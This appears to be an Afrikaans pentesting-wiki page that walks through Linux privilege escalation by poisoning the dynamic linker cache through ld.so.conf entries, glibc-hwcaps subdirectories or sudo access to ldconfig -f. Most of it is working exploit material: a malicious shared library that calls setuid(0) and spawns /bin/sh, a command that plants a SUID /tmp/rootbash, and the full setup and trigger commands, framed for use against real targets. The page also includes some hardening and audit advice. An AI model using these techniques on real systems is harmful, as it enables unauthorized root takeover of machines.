# ld.so privesc exploit voorbeeld

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy is 'n gefokusde lab vir die vergiftiging van die **system linker cache via `/etc/ld.so.conf` of `ldconfig`**. Vir missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` en ander generiese SUID linker abuse, sien [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Berei die omgewing voor

In die volgende afdeling kan jy die kode vind van die lêers wat ons gaan gebruik om die omgewing voor te berei.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Skep** daardie lêers op jou masjien in dieselfde vouer
2. **Kompileer** die **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieer** `libcustom.so` na `/usr/lib` en verfris die kas: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompileer** die **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kontroleer die omgewing

Kontroleer dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre lêer kan **uitvoer**.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nuttige triage-opdragte

Wanneer jy ’n regte teiken aanval, verifieer die **presiese biblioteeknaam** wat die binêre lêer benodig, wat die loader **tans resolve**, en watter gekonfigureerde paaie skryfbaar is sonder om die aktiewe cache te wysig.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Gebruik `ldd` slegs op ’n **vertroude** uitvoerbare lêer. Sommige implementerings of ongewone ELF-interpreters kan veroorsaak dat dit aanvaller-beheerde code uitvoer; `objdump -p ./file | grep NEEDED` lys direkte dependencies veilig. Vir ’n vertroude teiken wys die aanroeping van die ontdekte interpreter met `--list` die werklike resolusie.<sup>[[4]](#references)</sup>

’n Paar nuttige slaggate:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **werk gewoonlik nie** omdat die redirection deur jou huidige shell gedoen word. Gebruik eerder
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/bevoorregte** binaries loop in **secure-execution mode**: `LD_LIBRARY_PATH`
word geïgnoreer, terwyl `LD_PRELOAD` beperk word (name wat ’n slash bevat, word
geïgnoreer, en slegs setuid-gemerkte libraries in standaarddirectories mag
preloaded word). Sodra root `ldconfig` uitvoer, kan directories wat in
`/etc/ld.so.conf` gelys word, in `/etc/ld.so.cache` beland; hierdie
misconfiguration kan dus steeds bevoorregte programme beïnvloed.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` word ook in secure-execution mode geïgnoreer tensy `/etc/suid-debug` bestaan, dus versamel die trace daarvan tydens ’n ekwivalente nie-SUID-run eerder as om output van die bevoorregte uitvoering te verwag.<sup>[[1]](#references)</sup>
- Op glibc 2.33 en nuwer stel die dynamic loader ook
`--list-diagnostics` bloot, wat masjienleesbare loader-diagnostics en
ingeboude search-path-inligting druk wanneer ’n hijack nie soos verwag werk nie.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache- en SONAME-beperkings

`ldconfig` cache nie elke arbitrêre file in ’n gekonfigureerde directory nie: dit ondersoek ELF headers, herken name wat met `lib*.so*` of `ld-*.so*` ooreenstem, en verwag die konvensionele `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`-chain. Die injected object moet dus die teiken se architecture/class, die presiese `DT_NEEDED`-naam (normaalweg sy `DT_SONAME`) en enige symbols/versions hê wat die victim resolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Gebruik eerder ’n target-spesifieke library soos hierdie voorbeeld. Deur ’n algemene SONAME met ’n onvolledige object te shadow, kan elke proses wat dit resolve voordat die beoogde bevoorregte target loop, breek.<sup>[[3]](#references)</sup>

## Exploit

In hierdie scenario, veronderstel ’n administrator het ’n kwesbare entry bygevoeg tot ’n
file onder `/etc/ld.so.conf.d/` wat deur die stelsel se
`/etc/ld.so.conf` ingesluit word.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Die kwesbare vouer is _/home/ubuntu/lib_ (waar ons skryftoegang het).\
**Laai af en compileer** die volgende kode binne daardie pad:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
As jy verwag dat **root** (of ’n ander bevoorregte rekening) die kwesbare binary later sal uitvoer, is dit gewoonlik beter om ’n **root-owned artifact** agter te laat eerder as om ’n interaktiewe shell te begin. Byvoorbeeld:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Dan, nadat die bevoorregte uitvoering plaasgevind het, kan jy `/tmp/rootbash -p` gebruik.

Noudat ons die **kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde** pad **geskep** het, moet die verstekkas deur ’n suksesvolle bevoorregte **`ldconfig`-uitvoering** herbou word. ’n Herlaai help slegs waar die plaaslike selflaaiproses dit werklik aanroep; andersins moet jy vir ’n administrateuraksie wag of ’n onveilige sudo-reël gebruik indien een beskikbaar is.<sup>[[2]](#references)</sup>

Nadat dit gebeur het, **kontroleer weer** waar die `sharedvuln`-uitvoerbare lêer die `libcustom.so`-biblioteek vandaan laai:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Soos jy kan sien, **laai dit dit vanaf `/home/ubuntu/lib`** en indien enige gebruiker dit uitvoer, sal ’n shell uitgevoer word:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Let daarop dat ons in hierdie voorbeeld nie voorregte verhoog het nie, maar deur die uitgevoerde commands te wysig en **te wag dat root of ’n ander bevoorregte gebruiker die kwesbare binary uitvoer**, sal ons voorregte kan verhoog.

### Moderne `glibc-hwcaps` shadowing

Sedert glibc 2.33 kan die loader geoptimaliseerde libraries onder `glibc-hwcaps/<level>/` binne **elke library-soekgids** verkies. Gevolglik is dit onvoldoende om slegs `/home/ubuntu/lib` na te gaan: ’n skryfbare versoenbare subgids soos `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` kan die basis-library shadow nadat `ldconfig` dit geïndekseer het, terwyl ander CPUs steeds die basisobjek gebruik. Dit bied ook ’n argitektuurselektiewe hijack wat gemis kan word wanneer validation op ’n ander CPU plaasvind.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Die huidige glibc hardening guidance beveel aan dat duplicate SONAMEs, non-default search locations en objects in `glibc-hwcaps`-subdirectories vermy word. Vanuit ’n audit-perspektief, pas ownership- en writeability-checks rekursief toe op gekonfigureerde directories en hul parent path components.<sup>[[3]](#references)</sup>

### Ander misconfigurations - Dieselfde vuln

In die vorige voorbeeld het ons ’n misconfiguration nageboots waar ’n administrator **’n nie-bevoorregte folder binne ’n configuration file in `/etc/ld.so.conf.d/` gestel het**.\
Maar daar is ander misconfigurations wat dieselfde vulnerability kan veroorsaak: indien jy **write permissions** in ’n gelaaide **config file** het, ’n file in ’n writable `/etc/ld.so.conf.d/`-directory kan skep, of na `/etc/ld.so.conf` kan skryf, kan jy dieselfde vulnerability configureer en exploit.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Gestel jy het sudo privileges oor `ldconfig`**.\
Jy kan met `-f` vir `ldconfig` aandui **watter configuration file om te lees**, dus kan ’n file wat attacker-controlled directories spesifiseer, veroorsaak dat `ldconfig` daardie folders by die cache voeg.<sup>[[2]](#references)</sup>\
Laat ons dus die files en folders skep wat nodig is om "/tmp" te load:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Soos aangedui in die **previous exploit**, **skep die kwaadwillige biblioteek binne `/tmp`**.\
En laastens, kom ons laai die pad en kyk waarvandaan die binary die biblioteek laai:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Soos jy kan sien, kan jy dieselfde vulnerability uitbuit as jy sudo privileges oor `ldconfig` het.** Die besonderhede van die opsies is belangrik wanneer ’n beperkte sudo-reël geassesseer word: `-f` kies ’n ander konfigurasie, maar herbou steeds `/etc/ld.so.cache`; `-C` herlei die cache elders; `-N` voorkom die herbou van die cache; en `-X` voorkom link-opdaterings, maar **herbou steeds die cache tensy dit saam met `-N` gebruik word**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening van die Dynamic Linker - Die GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostiek van die Dynamic Linker (Die GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
